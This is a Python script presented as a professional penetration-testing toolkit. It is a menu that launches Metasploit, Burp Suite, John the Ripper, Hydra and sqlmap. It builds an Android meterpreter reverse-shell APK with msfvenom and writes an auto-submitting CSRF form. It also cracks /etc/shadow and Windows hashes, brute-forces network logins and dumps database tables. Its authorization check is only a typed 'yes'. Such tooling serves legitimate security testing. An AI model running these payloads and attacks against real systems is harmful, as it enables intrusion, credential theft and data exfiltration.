#!/usr/bin/env python3
# professional_ethical_toolkit.py
# COMPREHENSIVE SECURITY TESTING FRAMEWORK - AUTHORIZED USE ONLY

import os
import sys
import subprocess
import time
from datetime import datetime
import json

class ProfessionalEthicalToolkit:
    def __init__(self):
        self.authorized = False
        self.testing_log = "professional_testing.log"
        self.verify_authorization()
    
    def verify_authorization(self):
        print("🔒 PROFESSIONAL ETHICAL SECURITY TESTING TOOLKIT")
        print("================================================")
        print("INCLUDES: Metasploit, Burp Suite, John, Hydra, SQLmap")
        print("LEGAL USE ONLY - STRICT AUTHORIZATION REQUIRED")
        print("="*53)
        
        print("\n⚠️  LEGAL WARNING:")
        print("• Use only on systems you own or have EXPLICIT written permission")
        print("• Unauthorized testing is ILLEGAL")
        print("• Log all activities for compliance")
        print("• Follow responsible disclosure policies")
        
        response = input("\nDo you have AUTHORIZATION and accept responsibility? (yes/no): ")
        if response.lower() != 'yes':
            print("❌ Access denied. Legal compliance required.")
            sys.exit(1)
        
        self.client_name = input("Enter client/organization name for logging: ")
        self.test_scope = input("Enter authorized testing scope (IP/domain range): ")
        self.authorized = True
        self.log_action("Toolkit accessed", f"Client: {self.client_name}, Scope: {self.test_scope}")
    
    def log_action(self, action, details=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = {
            "timestamp": timestamp,
            "client": self.client_name,
            "scope": self.test_scope,
            "action": action,
            "details": details
        }
        with open(self.testing_log, "a") as log_file:
            log_file.write(json.dumps(log_entry) + "\n")
    
    def metasploit_integration(self):
        """Metasploit Framework integration for authorized testing"""
        if not self.authorized:
            return
        
        print("\n💣 Metasploit Framework Integration")
        print("1. Android Security Testing")
        print("2. Windows/Linux Exploit Testing") 
        print("3. Post-Exploitation Modules")
        print("4. Generate Payload (Authorized Only)")
        
        choice = input("Select option: ")
        
        if choice == "1":
            self.metasploit_android_testing()
        elif choice == "2":
            self.metasploit_exploit_testing()
        elif choice == "3":
            self.metasploit_post_exploit()
        elif choice == "4":
            self.metasploit_payload_generator()
    
    def metasploit_android_testing(self):
        """Authorized Android security testing with Metasploit"""
        print("\n📱 Android Security Testing with Metasploit")
        print("Available modules for AUTHORIZED testing:")
        print("• android/metpreter/reverse_tcp")
        print("• android/fileformat/")
        print("• auxiliary modules")
        
        lhost = input("Enter your LISTENER IP (authorized): ")
        lport = input("Enter LISTENER port: ")
        output_name = input("Enter output APK name: ")
        
        # Generate payload for authorized testing
        try:
            cmd = [
                'msfvenom', '-p', 'android/meterpreter/reverse_tcp',
                f'LHOST={lhost}', f'LPORT={lport}', '-o', f'{output_name}.apk'
            ]
            print(f"Executing: {' '.join(cmd)}")
            print("⚠️  FOR AUTHORIZED TESTING ONLY")
            
            confirm = input("Confirm generation? (yes/no): ")
            if confirm.lower() == 'yes':
                subprocess.run(cmd)
                self.log_action("Metasploit Android payload generated", 
                              f"LHOST={lhost}, LPORT={lport}")
        except Exception as e:
            print(f"Error: {e}. Ensure Metasploit is installed.")
    
    def metasploit_exploit_testing(self):
        """Legitimate exploit testing framework"""
        print("\n🔍 Metasploit Exploit Testing")
        target = input("Enter AUTHORIZED target IP: ")
        
        # Example exploit search and testing
        try:
            # Search for exploits
            search_term = input("Enter exploit search term (e.g., 'android', 'http'): ")
            subprocess.run(['msfconsole', '-x', f'search {search_term}'])
            
            print("\nUse msfconsole manually for detailed testing:")
            print(f"msfconsole")
            print(f"use exploit/path/name")
            print(f"set RHOSTS {target}")
            print(f"exploit")
            
            self.log_action("Metasploit exploit testing", f"Target: {target}")
        except Exception as e:
            print(f"Error: {e}")
    
    def burp_suite_integration(self):
        """Burp Suite integration for web app testing"""
        print("\n🌐 Burp Suite Web Application Testing")
        print("1. Start Burp Suite Proxy")
        print("2. Generate CSRF PoC")
        print("3. SQL Injection Testing Helper")
        print("4. XSS Testing Helper")
        
        choice = input("Select option: ")
        
        if choice == "1":
            print("Starting Burp Suite...")
            try:
                subprocess.Popen(['burpsuite'])
                print("Burp Suite started. Configure browser to proxy: 127.0.0.1:8080")
            except:
                print("Burp Suite not found. Install from portswigger.net")
        
        elif choice == "2":
            target_url = input("Enter target URL for CSRF PoC: ")
            self.generate_csrf_poc(target_url)
    
    def generate_csrf_poc(self, url):
        """Generate CSRF Proof of Concept"""
        poc_template = f"""
<html>
<body>
<form action="{url}" method="POST">
    <input type="hidden" name="param" value="test">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
<!-- CSRF PoC for AUTHORIZED testing only -->
"""
        with open("csrf_poc.html", "w") as f:
            f.write(poc_template)
        print("CSRF PoC saved as csrf_poc.html")
        self.log_action("CSRF PoC generated", f"Target: {url}")
    
    def john_ripper_integration(self):
        """John the Ripper password testing"""
        print("\n🔑 John the Ripper Password Testing")
        print("1. Crack Linux /etc/shadow hashes")
        print("2. Crack Windows hashes")
        print("3. Wordlist attack")
        print("4. Brute force attack")
        
        choice = input("Select option: ")
        hash_file = input("Enter hash file path (authorized testing only): ")
        
        try:
            if choice == "1":
                subprocess.run(['john', hash_file])
            elif choice == "2":
                subprocess.run(['john', '--format=NT', hash_file])
            elif choice == "3":
                wordlist = input("Enter wordlist path: ")
                subprocess.run(['john', '--wordlist=' + wordlist, hash_file])
            
            self.log_action("John the Ripper execution", f"Hash file: {hash_file}")
        except Exception as e:
            print(f"Error: {e}")
    
    def hydra_integration(self):
        """Hydra network login testing"""
        print("\n🌊 Hydra Network Login Testing")
        target = input("Enter AUTHORIZED target IP: ")
        service = input("Enter service (ssh, ftp, http-post-form, etc): ")
        username = input("Enter username or user list file: ")
        
        print("Available attack types:")
        print("1. Password list attack")
        print("2. Brute force attack")
        
        attack_type = input("Select attack type: ")
        
        try:
            if attack_type == "1":
                pass_file = input("Enter password list file: ")
                cmd = ['hydra', '-l', username, '-P', pass_file, target, service]
            else:
                cmd = ['hydra', '-l', username, '-x', '6:8:a', target, service]
            
            print(f"Command: {' '.join(cmd)}")
            confirm = input("Execute? (yes/no): ")
            if confirm.lower() == 'yes':
                subprocess.run(cmd)
                self.log_action("Hydra login testing", f"Target: {target}, Service: {service}")
        except Exception as e:
            print(f"Error: {e}")
    
    def sqlmap_integration(self):
        """SQLmap SQL injection testing"""
        print("\n💉 SQLmap SQL Injection Testing")
        url = input("Enter AUTHORIZED target URL: ")
        
        print("SQLmap options:")
        print("1. Basic SQL injection test")
        print("2. Extensive testing")
        print("3. Database enumeration")
        print("4. Data extraction")
        
        choice = input("Select option: ")
        
        try:
            if choice == "1":
                cmd = ['sqlmap', '-u', url, '--batch']
            elif choice == "2":
                cmd = ['sqlmap', '-u', url, '--level=5', '--risk=3', '--batch']
            elif choice == "3":
                cmd = ['sqlmap', '-u', url, '--dbs', '--batch']
            elif choice == "4":
                db = input("Enter database name: ")
                table = input("Enter table name: ")
                cmd = ['sqlmap', '-u', url, '-D', db, '-T', table, '--dump', '--batch']
            
            print(f"Executing: {' '.join(cmd)}")
            subprocess.run(cmd)
            self.log_action("SQLmap SQL injection test", f"Target: {url}")
        except Exception as e:
            print(f"Error: {e}. Install sqlmap: sudo apt install sqlmap")
    
    def show_menu(self):
        while True:
            print("\n" + "="*60)
            print("        PROFESSIONAL ETHICAL SECURITY TESTING TOOLKIT")
            print("="*60)
            print("1. Metasploit Framework")
            print("2. Burp Suite Integration") 
            print("3. John the Ripper")
            print("4. Hydra Network Testing")
            print("5. SQLmap SQL Injection")
            print("6. Comprehensive Report Generator")
            print("7. Legal Compliance Check")
            print("8. Exit")
            print("="*60)
            print(f"Client: {self.client_name} | Scope: {self.test_scope}")
            print("="*60)
            
            choice = input("Select option (1-8): ")
            
            if choice == "1":
                self.metasploit_integration()
            elif choice == "2":
                self.burp_suite_integration()
            elif choice == "3":
                self.john_ripper_integration()
            elif choice == "4":
                self.hydra_integration()
            elif choice == "5":
                self.sqlmap_integration()
            elif choice == "6":
                self.generate_report()
            elif choice == "7":
                self.legal_compliance()
            elif choice == "8":
                print("🔒 Professional toolkit closed. Logs saved.")
                break
            else:
                print("Invalid option")
    
    def generate_report(self):
        """Generate professional security assessment report"""
        print("\n📊 Generating Security Assessment Report")
        
        report = f"""
SECURITY ASSESSMENT REPORT
==========================
Client: {self.client_name}
Testing Scope: {self.test_scope}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Tester: Ethical Security Toolkit

EXECUTIVE SUMMARY:
------------------
This report contains findings from authorized security testing.

METHODOLOGY:
------------
- Automated vulnerability scanning
- Manual penetration testing
- Security tool assessment

FINDINGS:
---------
[Detailed findings would be inserted here]

RECOMMENDATIONS:
----------------
1. Regular security assessments
2. Patch management implementation
3. Security awareness training

LEGAL DISCLAIMER:
-----------------
This assessment was conducted with proper authorization.
All activities were logged and documented.
"""
        filename = f"security_report_{self.client_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, "w") as f:
            f.write(report)
        print(f"Report saved as: {filename}")
    
    def legal_compliance(self):
        """Display legal compliance information"""
        print("\n⚖️ LEGAL COMPLIANCE INFORMATION")
        print("="*50)
        print("REQUIRED FOR PROFESSIONAL TESTING:")
        print("1. Written Authorization from system owner")
        print("2. Defined testing scope and boundaries")
        print("3. Non-disclosure agreements")
        print("4. Responsible disclosure policy")
        print("5. Activity logging and documentation")
        print("6. Compliance with local laws")
        print("\nRECOMMENDED CERTIFICATIONS:")
        print("- OSCP (Offensive Security Certified Professional)")
        print("- CEH (Certified Ethical Hacker)")
        print("- CISSP (Certified Information Systems Security Professional)")

if __name__ == "__main__":
    # Check if running as root (some tools require elevated privileges)
    if os.geteuid() != 0:
        print("⚠️  Some tools may require root privileges")
        print("Consider running with sudo for full functionality")
    
    toolkit = ProfessionalEthicalToolkit()
    toolkit.show_menu()